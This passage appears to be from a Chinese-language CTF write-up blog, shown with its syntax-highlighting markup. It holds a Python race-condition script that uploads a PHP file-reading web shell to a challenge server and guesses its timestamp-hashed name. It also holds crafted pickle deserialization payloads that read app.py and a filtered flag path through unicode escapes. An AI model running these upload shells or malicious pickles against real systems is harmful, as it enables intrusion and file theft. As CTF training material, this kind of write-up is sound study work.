operator">-</span>t1    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Found file:"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Not found:"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    date<span class="token punctuation">,</span> t1 <span class="token operator">=</span> upload_and_get_date<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> date<span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[!] No date found"</span><span class="token punctuation">)</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>upload_blacklist_file<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>t2<span class="token operator">-</span>t1<span class="token punctuation">)</span>    t2<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>t2<span class="token punctuation">)</span>    <span class="token comment"># 时间差</span>    delay <span class="token operator">=</span> t2 <span class="token operator">-</span> t1    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Time delay = </span><span class="token interpolation"><span class="token punctuation">{</span>delay<span class="token punctuation">}</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 爆破 offset 范围（±3 秒）</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>delay<span class="token punctuation">,</span> delay<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        h2 <span class="token operator">=</span> calc_md5<span class="token punctuation">(</span>date<span class="token punctuation">,</span> offset<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Trying offset=</span><span class="token interpolation"><span class="token punctuation">{</span>offset<span class="token punctuation">}</span></span><span class="token string">, md5(int(date)+offset)=</span><span class="token interpolation"><span class="token punctuation">{</span>h2<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> check_file<span class="token punctuation">(</span>h2<span class="token punctuation">,</span>t1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Full JSON<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'success'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'�ļ��ϴ��ɹ�'</span><span class="token punctuation">,</span> <span class="token string">'date'</span><span class="token punctuation">:</span> <span class="token string">'20250907090046'</span><span class="token punctuation">,</span> <span class="token string">'file_path'</span><span class="token punctuation">:</span> <span class="token string">'uploads/d02f03e7f22d2f296b967987dcd7cdf9.png'</span><span class="token punctuation">}</span><span class="token number">0.8296563625335693</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Time delay <span class="token operator">=</span> 0s<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Trying offset<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> md5<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token operator">=</span>d02f03e7f22d2f296b967987dcd7cdf9<span class="token number">0.9817290306091309</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found <span class="token builtin">file</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">119.233</span><span class="token number">.150</span><span class="token number">.205</span><span class="token punctuation">:</span><span class="token number">57965</span><span class="token operator">/</span>uploads<span class="token operator">/</span>d02f03e7f22d2f296b967987dcd7cdf9<span class="token punctuation">.</span>phpflag<span class="token punctuation">{</span>58cb100915<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> threading<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedelta<span class="token comment"># 上传接口及请求头</span>UPLOAD_URL <span class="token operator">=</span> <span class="token string">"http://119.233.150.205:57965/upload.php"</span>UPLOAD_HEADERS <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----abcdefghijklmnop"</span><span class="token punctuation">}</span><span class="token comment"># 上传 payload</span>PAYLOAD <span class="token operator">=</span> <span class="token string">"&lt;?= print_r(file('/flag.txt'));"</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span>filename<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    上传文件到指定 URL    """</span>    data <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string-interpolation"><span class="token string">f"------abcdefghijklmnop\r\n"</span></span>        <span class="token string-interpolation"><span class="token string">f"Content-Disposition: form-data; name=\"file\"; filename=\"</span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">\"\r\n"</span></span>        <span class="token string-interpolation"><span class="token string">f"Content-Type: image/png\r\n\r\n"</span></span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>PAYLOAD<span class="token punctuation">}</span></span><span class="token string">\r\n"</span></span>        <span class="token string-interpolation"><span class="token string">f"------abcdefghijklmnop--\r\n"</span></span>    <span class="token punctuation">)</span>    <span class="token keyword">return</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>UPLOAD_URL<span class="token punctuation">,</span> headers<span class="token operator">=</span>UPLOAD_HEADERS<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    检查上传的文件是否可以访问    """</span>    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://119.233.150.205:57965/uploads/</span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">"</span></span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">generate_md5_filenames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    生成时间戳 ±2 秒的 MD5 文件名列表    """</span>    filenames <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    now <span class="token operator">=</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        ts <span class="token operator">=</span> <span class="token punctuation">(</span>now <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>seconds<span class="token operator">=</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y%m%d%H%M%S"</span><span class="token punctuation">)</span>        filenames<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>ts<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".php"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> filenames<span class="token triple-quoted-string string">"""假设目标服务器在保存上传时用了 md5(时间戳字符串) 作为文件名（例如 md5("20250907123456")），脚本尝试当前 UTC 时间及其 ±1、±2 秒的时间戳，生成对应的 MD5 值作为候选（带 .php 后缀）。"""</span><span class="token keyword">def</span> <span class="token function">monitor_files</span><span class="token punctuation">(</span>filenames<span class="token punctuation">,</span> stop_event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    并发监控文件是否可访问    """</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">for</span> f <span class="token keyword">in</span> filenames<span class="token punctuation">:</span>            <span class="token keyword">if</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span>            <span class="token keyword">if</span> check_file<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>                stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>                <span class="token triple-quoted-string string">"""每个线程会最多循环 50 次，每次检查 filenames 中的每个候选名。一旦 check_file 返回 True（可访问），线程会把 stop_event 置位，通知其他线程停止。time.sleep(0.01) 是短暂的等待，避免把 CPU 打满。"""</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 上传一个固定文件</span>    upload<span class="token punctuation">(</span><span class="token string">"1.jpg"</span><span class="token punctuation">)</span>    <span class="token comment"># 生成 MD5 时间戳文件名</span>    filenames <span class="token operator">=</span> generate_md5_filenames<span class="token punctuation">(</span><span class="token punctuation">)</span>    stop_event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""：创建一个线程间的信号对象（事件）。这个 Event 可以被线程轮询 (stop_event.is_set()) 来判断是否该停止工作。当主线程调用 stop_event.set() 时，所有监控线程都会立刻感知到，然后退出。"""</span>    <span class="token comment"># 并发监控文件</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>monitor_files<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>filenames<span class="token punctuation">,</span> stop_event<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token triple-quoted-string string">"""创建 5 个线程对象，每个线程执行同一个函数 monitor_files()，传入两个参数：filenames：一组要监控的文件名（候选 md5.php 文件）。stop_event：上面那个控制信号，用来通知线程停止。"""</span>    <span class="token keyword">for</span> th <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        th<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>    <span class="token comment"># 上传带特殊扩展名的文件</span>    upload<span class="token punctuation">(</span><span class="token string">"1.pHp"</span><span class="token punctuation">)</span>    stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 停止监控</span>    <span class="token keyword">for</span> th <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        th<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>Array<span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> flag<span class="token punctuation">{</span>58cb100915<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token number">1</span>Array<span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> flag<span class="token punctuation">{</span>58cb100915<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token number">1</span>Array<span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> flag<span class="token punctuation">{</span>58cb100915<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token number">1</span>Array<span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> flag<span class="token punctuation">{</span>58cb100915<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token number">1</span>Array<span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">&gt;</span> flag<span class="token punctuation">{</span>58cb100915<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="forge"><a href="#forge" class="headerlink" title="forge"></a>forge</h3><p>先是全角绕过，注册一个<code>ａｄｍｉｎ</code>，登陆。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token comment"># # 写入PKL文件</span><span class="token comment"># with open("data.pkl", "wb") as f:</span><span class="token comment">#     pickle.dump(data, f)</span><span class="token comment"># 从PKL文件读取</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"D:\\Downloads\\example.pkl"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token comment"># pickle_a=pickletools.optimize(f)</span>    <span class="token comment"># print(pickle_a)</span>    pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token comment">#     loaded_data = pickle.load(f)</span><span class="token comment"># print(loaded_data)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 <code>example.pkl</code> 可知 <code>CHIKAWA</code> 类的 <code>data</code> 属性会被再次反序列化，并输出结果</p><p>通过构造 <code>getattr(pathlib.Path, 'read_text')(pathlib.PosixPath('app.py'))</code> 读取 <code>app.py</code></p><p>但是 <code>flag</code> 被过滤了，使用 unicode 编码绕过</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">CHIKAWA</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>model_name <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>parameters <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>self<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>obj <span class="token operator">=</span> CHIKAWA<span class="token punctuation">(</span><span class="token punctuation">)</span>obj<span class="token punctuation">.</span>model_name <span class="token operator">=</span> <span class="token string">"mzzz"</span>obj<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""cpathlibPathp0cbuiltinsgetattr(g0S'read_text'tRp1cpathlibPosixPath(S'app.py'tRp2g1(g2tR."""</span>obj<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""cpathlibPathp0cbuiltinsgetattr(g0S'read_text'tRp1cpathlibPosixPath(V\u002f\u0066\u006c\u0061\u0067tRp2g1(g2tR."""</span>blob <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'mzzz.pkl'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传 <code>mzzz.pkl</code> ，执行</p><p>上面这个会直接<strong>把 <code>app.py</code> 的内容变成字符串存进 <code>data</code></strong>，而不是在服务器执行时读取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token comment"># # 写入PKL文件</span><span class="token comment"># with open("data.pkl", "wb") as f:</span><span class="token comment">#     pickle.dump(data, f)</span><span class="token comment"># 从PKL文件读取</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"D:\\Downloads\\example.pkl"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token comment"># pickle_a=pickletools.optimize(f)</span>    <span class="token comment"># print(pickle_a)</span>    pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token comment">#     loaded_data = pickle.load(f)</span><span class="token comment"># print(loaded_data)</span>      <span class="token number">0</span><span class="token punctuation">:</span> \x80 PROTO      <span class="token number">4</span>    <span class="token number">2</span><span class="token punctuation">:</span> \x95 FRAME      <span class="token number">112</span>   <span class="token number">11</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'__main__'</span>   <span class="token number">21</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token number">22</span><span class="token punctuation">:</span> \x8c SHORT_BINUNICODE <span class="token string">'CHIKAWA'</span>   <span class="token number">31</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">1</span><span class="token punctuation">)</span>   <span class="token number">32</span><span class="token punctuation">:</span> \x93 STACK_GLOBAL   <span class="token number">33</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token number">34</span><span class="token punctuation">:</span> <span class="token punctuation">)</span>    EMPTY_TUPLE   <span class="token number">35</span><span class="token punctuation">:</span> \x81 NEWOBJ   <span class="token number">36</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">3</span><span class="token punctuation">)</span>   <span class="token number">37</span><span class="token punctuation">:</span> <span class="token punctuation">}</span>    EMPTY_DICT   <span class="token number">38</span><span class="token punctuation">:</span> \x94 MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">4</span><span class="token punctuation">)</span>   <span class="token number">39</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    MARK   <span class="token number">40</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'model_name'</span>   <span class="token number">52</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">5</span><span class="token punctuation">)</span>   <span class="token number">53</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'Example'</span>   <span class="token number">62</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">6</span><span class="token punctuation">)</span>   <span class="token number">63</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'data'</span>   <span class="token number">69</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">7</span><span class="token punctuation">)</span>   <span class="token number">70</span><span class="token punctuation">:</span> C        SHORT_BINBYTES <span class="token string">b"cbuiltins\nprint\n(S'chikawa'\ntR."</span>  <span class="token number">103</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">8</span><span class="token punctuation">)</span>  <span class="token number">104</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">'parameters'</span>  <span class="token number">116</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">9</span><span class="token punctuation">)</span>  <span class="token number">117</span><span class="token punctuation">:</span> \x8c     SHORT_BINUNICODE <span class="token string">''</span>  <span class="token number">119</span><span class="token punctuation">:</span> \x94     MEMOIZE    <span class="token punctuation">(</span><span class="token keyword">as</span> <span class="token number">10</span><span class="token punctuation">)</span>  <span class="token number">120</span><span class="token punctuation">:</span> u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">39</span><span class="token punctuation">)</span>  <span class="token number">121</span><span class="token punctuation">:</span> b    BUILD  <span class="token number">122</span><span class="token punctuation">:</span> <span class="token punctuation">.</span>    STOPhighest protocol among opcodes <span class="token operator">=</span> <span class="token number">4</span><span class="token operator">&lt;</span>_io<span class="token punctuation">.</span>BufferedReader name<span class="token operator">=</span><span class="token string">'D:\\Downloads\\example.pkl'</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token comment"># 定义类（名字和服务器的一致）</span><span class="token keyword">class</span> <span class="token class-name">CHIKAWA</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>model_name <span class="token operator">=</span> <span class="token string">"Example"</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>parameters <span class="token operator">=</span> <span class="token string">""</span><span class="token comment"># 构造 payload (你可以改成恶意的)</span>inner_payload <span class="token operator">=</span> <span class="token string">b"cbuiltins\nprint\n(S'chikawa'\ntR."</span><span class="token comment"># 把 payload 塞进 data</span>obj <span class="token operator">=</span> CHIKAWA<span class="token punctuation">(</span><span class="token punctuation">)</span>obj<span class="token punctuation">.</span>data <span class="token operator">=</span> inner_payload<span class="token comment"># 序列化</span>blob <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment"># 保存成 pkl 文件</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.pkl"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">不知道对不对<span class="token keyword">import</span> pickle<span class="token comment"># 延迟执行 payload</span><span class="token keyword">class</span> <span class="token class-name">ReadApp</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> pathlib        <span class="token comment"># 这里不执行，只告诉 pickle 反序列化时执行</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>pathlib<span class="token punctuation">.</span>Path<span class="token punctuation">,</span> <span class="token string">'read_text'</span><span class="token punctuation">)</span><span class="token 